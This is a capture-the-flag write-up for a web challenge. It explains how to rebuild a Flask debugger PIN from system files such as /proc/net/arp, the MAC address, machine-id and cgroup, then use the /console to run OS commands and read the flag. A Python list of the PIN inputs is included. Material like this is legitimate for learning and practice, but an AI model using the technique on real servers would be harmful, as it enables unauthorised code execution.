# Scam Report

Author: Reyes

> I created a webapp that allows users to report a email/phone number together with a description to let the authorities  know if a particular source is indeed a scammer.

**Difficulty: Hard**

## Solution

Participants are required to reconstruct a flask debug pin to exfiltrate the flag since getting the flag out directly by SSTI is not allowed.

```python
public = [
  'root', # USER set in Dockerfile
  'flask.app', # this is standard
  'Flask', # this is standard
  '/usr/local/lib/python3.11/site-packages/flask/app.py' # play around locally on Docker to find this
]
private = [
  '2485377892354', # /proc/net/arp to get eth0 interface name, then /sys/class/net/eth0/address, convert MAC address to decimal
  'a3d50743-d72d-4b53-90d1-e9079fbbd2b1c3ce014792c7dea042128a41822a77efdca0ec1f142c5edaf16955c623866689'
  # Concatenates data from [ /etc/machine-id OR /proc/sys/kernel/random/boot_id ] with the first line of /proc/self/cgroup post the last slash (/) (on linux).
]
```

Solve script provided.

Then, go to /console, enter the pin, import os and cat flag.